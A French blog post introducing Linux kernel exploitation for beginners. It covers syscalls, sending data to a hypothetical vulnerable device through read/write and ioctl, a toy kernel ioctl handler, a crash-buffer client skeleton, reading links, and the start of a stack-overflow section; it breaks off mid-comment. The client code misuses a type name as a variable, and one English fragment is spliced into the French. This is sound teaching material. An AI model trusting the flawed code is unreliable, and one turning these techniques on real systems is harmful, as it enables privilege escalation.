<!DOCTYPE html>
<html lang="fr">
<head>
  
    <title>Introduction à l&#39;exploitation kernel :: kernemporium</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Qu&amp;rsquo;est ce que l&amp;rsquo;exploitation kernel Syscall vulnérables The techniques used in order to exploit this kind of L&amp;rsquo;exploitation du kernel est l&amp;rsquo;exploitation des failles de sécurité dans le ring 0. Les techniques utilisées pour exploiter ce type de vulnérabilité sont un peu différentes de l&amp;rsquo;exploitation d&amp;rsquo;une application en &amp;ldquo;userland&amp;rdquo;. Et quand vous êtes débutants, c&amp;rsquo;est pas forcément un domaine conseillé de par le fait que cela demande pas mal de prérequis." />
<meta name="keywords" content="RE, pwn, ctf, kernel" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/fr/kernel/intro/" />




<link rel="stylesheet" href="/assets/style.css">






<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="/img/favicon/orange.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="fr" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Introduction à l&#39;exploitation kernel">
<meta property="og:description" content="Qu&amp;rsquo;est ce que l&amp;rsquo;exploitation kernel Syscall vulnérables The techniques used in order to exploit this kind of L&amp;rsquo;exploitation du kernel est l&amp;rsquo;exploitation des failles de sécurité dans le ring 0. Les techniques utilisées pour exploiter ce type de vulnérabilité sont un peu différentes de l&amp;rsquo;exploitation d&amp;rsquo;une application en &amp;ldquo;userland&amp;rdquo;. Et quand vous êtes débutants, c&amp;rsquo;est pas forcément un domaine conseillé de par le fait que cela demande pas mal de prérequis." />
<meta property="og:url" content="/fr/kernel/intro/" />
<meta property="og:site_name" content="kernemporium" />

  
    <meta property="og:image" content="/img/favicon/orange.png">
  

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2021-03-31 00:00:00 &#43;0000 UTC" />












</head>
<body class="orange">


<div class="container full headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/fr">
  <div class="logo">
    kernemporium
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/fr/heap">heap</a></li>
        
      
        
          <li><a href="/fr/kernel/">kernel</a></li>
        
      
        
          <li><a href="/fr/whoami/whoami">whoami</a></li>
        
      
      
    

    
    <div class="spacer"></div>
    <ul class="language-selector">
      <ul class="language-selector-current">
          <li>Français ▾</li>
      </ul>
      <ul class="language-selector__more hidden">
        
        <li><a href="/">English</a></li>
        
        <li><a href="/fr/">Français</a></li>
        
      </ul>
    </ul>
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/fr/heap">heap</a></li>
      
    
      
        <li><a href="/fr/kernel/">kernel</a></li>
      
    
      
        <li><a href="/fr/whoami/whoami">whoami</a></li>
      
    
    
    <hr />
      
        <li>
          <a href="/">English</a>
        </li>
      
        <li>
          <a href="/fr/">Français</a>
        </li>
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/fr/kernel/intro/">Introduction à l&rsquo;exploitation kernel</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2021-03-31 
      </span>
    
    
  </div>

  
  <span class="post-tags">
    
    #<a href="/fr/tags/kernel/">kernel</a>&nbsp;
    
    #<a href="/fr/tags/newbie/">newbie</a>&nbsp;
    
    #<a href="/fr/tags/pwn/">pwn</a>&nbsp;
    
    #<a href="/fr/tags/buffer-overflow/">buffer overflow</a>&nbsp;
    
  </span>
  

  

  

  <div class="post-content"><div>
        <h1 id="quest-ce-que-lexploitation-kernel">Qu&rsquo;est ce que l&rsquo;exploitation kernel<a href="#quest-ce-que-lexploitation-kernel" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h4 id="syscall-vulnérables">Syscall vulnérables<a href="#syscall-vulnérables" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>The techniques used in order to exploit this kind of L&rsquo;exploitation du kernel est l&rsquo;exploitation des failles de sécurité dans le <a href="https://manybutfinite.com/post/cpu-rings-privilege-and-protection/">ring 0</a>. Les techniques utilisées pour exploiter ce type de vulnérabilité sont un peu différentes de l&rsquo;exploitation d&rsquo;une application en &ldquo;userland&rdquo;. Et quand vous êtes débutants, c&rsquo;est pas forcément un domaine conseillé de par le fait que cela demande pas mal de prérequis. En „ring 0“ ou dans en „kernel land“,on retrouve le coeur du système d&rsquo;exploitation. Par exemple, une application en „userland“ passe en „kernel land“ pour de nombreuses raisons telles que l&rsquo;accès au hardwar ou les fonctionnalités natives/privilégiées de votre système d&rsquo;exploitation, souvent pour des opérations plus bas niveaux : :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* Small x86-64 application in nasm */</span>

global _start

_start:
    xor rdi, rdi ; <span style="color:#75715e">// set rdi to zero
</span><span style="color:#75715e"></span>    mov rax, <span style="color:#ae81ff">60</span> ; <span style="color:#75715e">// syscall number for exit
</span><span style="color:#75715e"></span>    syscall ; <span style="color:#75715e">// &lt;- entry in kernel land for exit(0)
</span></code></pre></div><p>Le 60 dans rax représente syscall number dans la <a href="https://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/">syscall table</a>. Le premier paramètre d&rsquo;un syscall est passé à rdi selon l'<a href="https://uclibc.org/docs/psABI-x86_64.pdf">abi</a>. Les prochains paramètres sont mis dans les registres : rsi, rdx, r8 and r9. Ces paramètres sont susceptibles non seulement d&rsquo;être mal utilisés, mais aussi de conduire à une vulnérabilité (exploitable bien évidement)! !</p>
<h4 id="devices-vulnérables">Devices vulnérables<a href="#devices-vulnérables" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Comme nous l&rsquo;avons vu précédemment, il est possible d&rsquo;exploiter sans encombre un appel système vulnérable à partir du userland, mais il y a aussi deux autres types de programmes qui tournent en kernel land qui peuvent être utilisés afin d&rsquo;augmenter vos privilèges : les kernel loadable modules (LKM) et les devices. Nous ne traiterons pas de l&rsquo;exploitation des LKM qui ne sont pas enregistrés en tant que devices et qui sont un peu différents à manipuler. On distingue principalement deux techniques qui permettent d&rsquo;envoyer des données à une device :</p>
<ul>
<li>Ouvrir la device et récupérer un file descriptor dessus et utilisez le syscall read / write afin de trigger la fonction associée comme read / write handler pour déclencher une vulnérabilité dans la fonction qui traitera les requètes read / write de notre programme userland selon le syscall que nous utilisons. Structure de base de payload pour de tels exploits:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdarg.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>  
<span style="color:#75715e">#define VULN_DEVICE &#34;/dev/im_vuln&#34; </span><span style="color:#75715e">// vuln name
</span><span style="color:#75715e"></span><span style="color:#75715e">#define LEN_CRASH 64
</span><span style="color:#75715e">#define LEN_READ 256
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
  <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(VULN_DEVICE, O_RDWR); <span style="color:#75715e">// Open in write / read
</span><span style="color:#75715e"></span>  
  <span style="color:#66d9ef">char</span> rbuf[LEN_READ];
  
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>pld <span style="color:#f92672">=</span> malloc(LEN_CRASH);
  
  memset(pld, <span style="color:#ae81ff">0x41</span>, LEN_CRASH);
  
  <span style="color:#75715e">/* Some basic check */</span>
  
  read(fd, rbuf, LEN_READ); <span style="color:#75715e">// Request data from kernel, trigger the read handler
</span><span style="color:#75715e"></span>  
  write(fd, pld, LEN_CRASH); <span style="color:#75715e">// Send data to the kernel, trigger the write handler
</span><span style="color:#75715e"></span>  
  <span style="color:#75715e">/* Theorically if the vuln is triggered, the code below is never reached */</span>
  
  close(fd);
  free(pld);

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Bien entendu, cette structure dépend de la vulnérabilité qui affecte la device. Une requète de 256 octets peut par exemple provoquer un comportement particulier qui rendra le syscall suivant vulnérable.</p>
<ul>
<li>Ou vous pouvez aussi interagir avec votre device grâce au syscall <a href="https://embetronicx.com/tutorials/linux/device-drivers/ioctl-tutorial-in-linux/">ioctl</a>. Pour interagir avec votre device avec ioctl, vous devez remplir au moins les paramètres suivants : :</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ioctl</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> request, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>arg);

<span style="color:#75715e">/*
</span><span style="color:#75715e">* Le champ fd représente votre file descriptor ouvert sur votre device.
</span><span style="color:#75715e">* Le champ requests représente la commande que vous voulez exécuter.
</span><span style="color:#75715e">* (vous le verez plus loin dans le code)
</span><span style="color:#75715e">* Pour finir, le pointeur args peut être n&#39;importe quelle variable,
</span><span style="color:#75715e">* la seule chose obligatoire est le code du noyau de votre device qui gérera votre argument et
</span><span style="color:#75715e">* votre requête en fonction du type et de la valeur de ces variables.
</span><span style="color:#75715e">*/</span>
</code></pre></div><p>Et parce que la pratique est plus claire, écrivons une device qui s&rsquo;occupera des appels à l&rsquo;ioctl:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/init.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/uaccess.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/fs.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/miscdevice.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define WRITE 2
</span><span style="color:#75715e">#define READ 3
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> file_operations f <span style="color:#f92672">=</span> {
  <span style="color:#75715e">/* ... */</span>
  .unlocked_ioctl <span style="color:#f92672">=</span> vuln_ioctl,
  <span style="color:#75715e">/* vuln_ioctl is registered as the ioctl handler, it will be called at every ioctl request from userland */</span>
};

<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> ioctl_read {
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rbuf;
} read_ioctl;

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">write</span>(<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>argp);
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>argp);

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">vuln_ioctl</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> request, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>arg_user){
  <span style="color:#66d9ef">int</span> ret;
  read_ioctl <span style="color:#f92672">*</span>argp <span style="color:#f92672">=</span> (read_ioctl <span style="color:#f92672">*</span>)arg_user;

  <span style="color:#66d9ef">switch</span> (request) {
    <span style="color:#66d9ef">case</span> WRITE:
      ret <span style="color:#f92672">=</span> write(argp);
      <span style="color:#66d9ef">break</span>;
    <span style="color:#66d9ef">case</span> READ:
      ret <span style="color:#f92672">=</span> read(argp);
      <span style="color:#66d9ef">break</span>;
    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
      ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; <span style="color:#75715e">/* Invalid request */</span>
  }

  <span style="color:#75715e">/* 
</span><span style="color:#75715e">  *  So request and argp can be anything according
</span><span style="color:#75715e">  *  to the fact that in your code the value of request
</span><span style="color:#75715e">  *  and argp are correctly handled
</span><span style="color:#75715e">  */</span>

  <span style="color:#66d9ef">return</span> ret;

}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">write</span>(read_ioctl __user <span style="color:#f92672">*</span>argp) {

  <span style="color:#75715e">/* 
</span><span style="color:#75715e">  *  Some dangerous stuff with argp
</span><span style="color:#75715e">  */</span> 

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#75715e">#define LEN_STR 28
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">read</span>(read_ioctl __user <span style="color:#f92672">*</span>argp) {
  <span style="color:#75715e">/*
</span><span style="color:#75715e">  *  This function will just copy either the argp-&gt;lenth bytes
</span><span style="color:#75715e">  *  of kstr in argp-&gt;rbuf or if argp-&gt;length &gt; LEN_STR, it will
</span><span style="color:#75715e">  *  just copy all the string in order to prevent bugs.
</span><span style="color:#75715e">  */</span> 

  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kstr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;I&#39;m a string in kernel land&#34;</span>;

  <span style="color:#66d9ef">if</span> (argp<span style="color:#f92672">-&gt;</span>length <span style="color:#f92672">&gt;=</span> LEN_STR) {
      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> copy_to_user(argp<span style="color:#f92672">-&gt;</span>rbuf, kstr, LEN_STR)) {
        printk(KERN_INFO <span style="color:#e6db74">&#34;[ERROR READ]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
      }

      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
  }

  <span style="color:#75715e">/* If the code below is reached, argp-&gt;length &lt; LEN_STR */</span>

  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> copy_to_user(argp<span style="color:#f92672">-&gt;</span>rbuf, kstr, argp<span style="color:#f92672">-&gt;</span>length)) {
    printk(KERN_INFO <span style="color:#e6db74">&#34;[ERROR READ]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

  <span style="color:#75715e">/* ... */</span>
</code></pre></div><p>En principe, si nous voulons lire/envoyer des données vers/depuis un programme qui traite nos requètes d&rsquo;ioctl, nous devons construire une structure comme celle-ci:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
</span><span style="color:#75715e">*  We are just taking the same code that previously
</span><span style="color:#75715e">*  but we send data with ioctl
</span><span style="color:#75715e">*/</span>

<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdarg.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define VULN_DEVICE &#34;/dev/im_vuln&#34;
</span><span style="color:#75715e">#define LEN_CRASH 64
</span><span style="color:#75715e">#define LEN_READ 256
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define WRITE 2
</span><span style="color:#75715e">#define READ 3
</span><span style="color:#75715e"></span>
<span style="color:#75715e">/* Same request than the code in kernel land */</span>

<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> ioctl_read {
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rbuf;
} read_ioctl;

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
  <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(VULN_DEVICE, O_RDWR); <span style="color:#75715e">/* Open in write / read */</span>

  read_ioctl r_arg <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};

  r_arg.rbuf <span style="color:#f92672">=</span> malloc(LEN_READ);

  read_ioctl.length <span style="color:#f92672">=</span> LEN_READ;
  memset(read_ioctl.rbuf, <span style="color:#ae81ff">0x0</span>, LEN_READ);

  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>pld <span style="color:#f92672">=</span> malloc(LEN_CRASH);

  memset(pld, <span style="color:#ae81ff">0x41</span>, LEN_CRASH);

  ioctl(fd, READ, <span style="color:#f92672">&amp;</span>r_arg);

  <span style="color:#75715e">/*
</span><span style="color:#75715e">  *  We send a READ request which will be interpreted as 
</span><span style="color:#75715e">  *  seen above. And then, the read_ioctl-&gt;length-n bytes 
</span><span style="color:#75715e">  *  will be copied in read_ioctl-&gt;rbuf.
</span><span style="color:#75715e">  */</span>

  ioctl(fd, WRITE, pld);

  <span style="color:#75715e">/* 
</span><span style="color:#75715e">  *  Same thing that for READ, the WRITE request is 
</span><span style="color:#75715e">  *  handled by in our example the write handler.
</span><span style="color:#75715e">  */</span> 

  close(fd);
  free(read_ioctl.rbuf);
  free(pld);

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Bien sûr, l&rsquo;objectif de cette partie n&rsquo;est pas d&rsquo;expliquer comment les devices sont développés et seuls quelques concepts sont obligatoires pour envoyer nos payloads dans le kernel land. Donc si vous êtes intéressé par le développement kernel sous linux et si vous voulez en savoir plus sur le kernel exploit sous linux, vous pouvez consulter les liens ci-dessous : (Malheuresement une grande majorité des ressources en informatique et encore plus en InfoSec sont en anglais mais vous pourrez sûrement trouver une traduction française ou vous mettre à la langue de Shakespeare aka l&rsquo;anglais ♥:</p>
<ul>
<li>
<p><a href="https://doc.lagout.org/operating%20system%20/linux/Understanding%20Linux%20Kernel.pdf">Understanding linux kernel</a>, l&rsquo;un des livres phares sur les rouages de linux, en particulier pour la gestion de la mémoire et la structure des processus. Mais attention, ce livre couvre le noyau linux 2.x.x et est donc un peu vieux. Cependant ça reste une référence.</p>
</li>
<li>
<p><a href="https://www.doc-developpement-durable.org/file/Projets-informatiques/cours-&amp;-manuels-informatiques/Linux/Linux%20Kernel%20Development,%203rd%20Edition.pdf">Linux kernel developpement</a>, Un livre sur le développement de KLM très intéressant pour les débutants et un peu plus récent que le précédent.</p>
</li>
<li>
<p><a href="https://pdos.csail.mit.edu/~sbw/links/gorman_book.pdf">Understanding the Linux Virtual Memory Manager</a> Un livre sur la gestion de la mémoire virtuelle sous linux. Mais attention, il est un peu plus poussé, pas vraiment destiné à des débutants. Il traite aussi des kernel allocators (tel que „slab“ / „slub“ / „slob“).</p>
</li>
<li>
<p><a href="https://index-of.es/Exploit/Attacking%20the%20core.pdf">A Guide to Kernel Exploitation Attacking the Core</a>, un livre de référence sur l&rsquo;exploitation des noyaux pour les débutants. Je suppose que c&rsquo;est l&rsquo;une des ressources les plus utiles pour apprendre l&rsquo;exploitation des noyaux. Malheureusement, il est assez ancien et aujourd&rsquo;hui les techniques d&rsquo;exploitation ont changé mais pour les noyaux inférieurs à ce 4.x.x, c&rsquo;est resté un peu la même chose. Je le conseil vraiment.</p>
</li>
<li>
<p><a href="https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-kemerlis.pdf">Paper about ret2dir attacks</a>, article très intéressant sur la façon d&rsquo;exploiter votre noyau avec l&rsquo;attaque re2dir.</p>
</li>
<li>
<p><a href="https://lira.epac.to/DOCS-TECH/Hacking/Reverse%20Engineering%20for%20Beginners.pdf">Reverse Engineering 4 Beginners</a>, si vous n&rsquo;êtes pas familier avec la programmation en assembleur Intel et que vous ne connaissez rien à la rétro-ingénierie (Reverse Engineering), il est important pour être prêt à commencer l&rsquo;exploitation du noyau que vous connaissiez quelques connaissances de base à ce sujet.</p>
</li>
<li>
<p><a href="http://phrack.org/issues/64/6.html">phrack Kernel Exploitation notes</a>, quelques notes intéressantes de phrack sur l&rsquo;exploitation du kernel et constitue un bon aperçu des différents types de vulnérabilités que l&rsquo;on peut trouver dans le domaine du kernel land et de la manière de les exploiter.</p>
</li>
<li>
<p>CVE-2017-11176 A step-by-step Linux Kernel exploitation by lexfo security (<a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">1</a>, <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">2</a>, <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">3</a>, <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">4</a>)très grande ressource pour l&rsquo;apprentissage de l&rsquo;exploitation du kernel, ces 4 parties sont aussi un bon point d&rsquo;entrée dans l&rsquo;exploitation du kernel.</p>
</li>
<li>
<p><a href="https://cse.yeditepe.edu.tr/~kserdaroglu/spring2014/cse331/termproject/BOOKS/ProfessionalLinuxKernelArchitecture-WolfgangMauerer.pdf">Professional Linux Kernel Architecture</a> Livre important sur les rouages du kernel linux. Il ressemble à Understanding linux kernel mais est un peu plus poussé sur certains chapitres.</p>
</li>
</ul>
<p>Maintenant que vous avez appris comment envoyer des données à votre device, nous allons voir quelques vulnérabilités qui peuvent affecter votre device et tout syscall dans le kernel land.</p>
<h2 id="les-vulnérabilités">Les vulnérabilités<a href="#les-vulnérabilités" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Comme cette page n&rsquo;est qu&rsquo;une introduction faite dans le seul but de vous donner une connaissance très basique de l&rsquo;exploitation kernel, une prochaine partie sera consacrée à chaque type de vulnérabilité, et approfondira l&rsquo;explication des techniques d&rsquo;exploitation.</p>
<h4 id="stack-based-buffer-overflow">Stack based buffer overflow<a href="#stack-based-buffer-overflow" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Un buffer overflow est une vulnérabilité très courante que vous avez déjà vu dans les programmes de l&rsquo;userland (si vous ne savez rien à ce sujet, je pense que le noyau de départ l&rsquo;exploitation n&rsquo;est pas très sûre et vous devriez plutôt vous pencher sur le ropemporium). Dans le kernel land, un débordement de pile apparaît comme en userland lorsque vous essayez d&rsquo;écrire dans un buffer auxquel vous avez attribué N octets de plus que N et que vous pouvez donc écraser le saved instruction pointer. Nous n&rsquo;approfondirons pas l&rsquo;explication de ce type de bugs mais nous verrons comment vous pouvez déclencher la vulnérabilité et ensuite l&rsquo;exploiter.</p>
<p>Typiquement, un débordement de pile est souvent le résultat de fonctions telles que strcpy() / memcpy() en userland ou de boucles directement dangereuses. Par exemple, la fonction du noyau utilisée pour copier un tampon du userland vers le kernel land est souvent <code>copy_from_user((void *to, const __user *from, unsigned long n);</code>, creusons davantage dans les rouages de cette fonction:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">copy_from_user</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>to, <span style="color:#66d9ef">const</span> __user <span style="color:#f92672">*</span>from, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> n);

<span style="color:#75715e">/* void *to is a Kernel land buffer to whom n bytes from the  
</span><span style="color:#75715e">*  const __user *from userland buffer will be copied.
</span><span style="color:#75715e">*  Note: The copy_from_user function checks the arguments in order to prevent 
</span><span style="color:#75715e">*  overflows as we can see below. 
</span><span style="color:#75715e">*/</span>

<span style="color:#66d9ef">static</span> __always_inline <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> __must_check
<span style="color:#a6e22e">copy_from_user</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>to, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>from, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> n)
{
  <span style="color:#66d9ef">if</span> (likely(check_copy_size(to, n, false)))
    n <span style="color:#f92672">=</span> _copy_from_user(to, from, n);
  <span style="color:#66d9ef">return</span> n;
}

<span style="color:#75715e">/* The check_copy_size(to, n, false) looks like it */</span>

<span style="color:#66d9ef">static</span> __always_inline __must_check <span style="color:#66d9ef">bool</span>
<span style="color:#a6e22e">check_copy_size</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>addr, size_t bytes, <span style="color:#66d9ef">bool</span> is_source)
{
  <span style="color:#66d9ef">int</span> sz <span style="color:#f92672">=</span> __compiletime_object_size(addr);

  <span style="color:#75715e">/* __compiletime_object_size(addr) returns the length of the object 
</span><span style="color:#75715e">  *  pointed by addr (addr can whatever in the object), it&#39;s possible 
</span><span style="color:#75715e">  *  if only for objects whose ranges can be determinated at 
</span><span style="color:#75715e">  *  compile time.
</span><span style="color:#75715e">  */</span>
  <span style="color:#66d9ef">if</span> (unlikely(sz <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> sz <span style="color:#f92672">&lt;</span> bytes)) {
    <span style="color:#75715e">/* n &gt; Our buffer -&gt; Overflow */</span>
  }
  <span style="color:#66d9ef">if</span> (WARN_ON_ONCE(bytes <span style="color:#f92672">&gt;</span> INT_MAX))
    <span style="color:#75715e">/*Max value for an int -&gt; crazy behaviour -&gt; error*/</span>
    <span style="color:#66d9ef">return</span> false;

  check_object_size(addr, bytes, is_source);
  
  <span style="color:#75715e">/* The check_object_size will try to determine if the object is a valid
</span><span style="color:#75715e">  *  object in the stack/heap and if addr + bytes stays in the stack frame.
</span><span style="color:#75715e">  *  According to the fact that for example if (addr + bytes) 
</span><span style="color:#75715e">  *  &gt; stackend, check_copy_size will abort the copy or return.
</span><span style="color:#75715e">  */</span>

  <span style="color:#66d9ef">return</span> true;
}

<span style="color:#75715e">/* Now take a look at _copy_from_user(to, from, n);
</span><span style="color:#75715e">*  
</span><span style="color:#75715e">*/</span> 

_copy_from_user(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>to, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>from, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> n)
{
  <span style="color:#75715e">/* likely() and unlikely() are just macros 
</span><span style="color:#75715e">  *  who are saying to the cpu:
</span><span style="color:#75715e">  *  - if(likely(condition)) { This code 
</span><span style="color:#75715e">  *  is basically executed there is not
</span><span style="color:#75715e">  *  conditional jmp toward another memory
</span><span style="color:#75715e">  *  page which is potentially not in the cache
</span><span style="color:#75715e">  *  and which will make that the execution will
</span><span style="color:#75715e">  *  be slower}
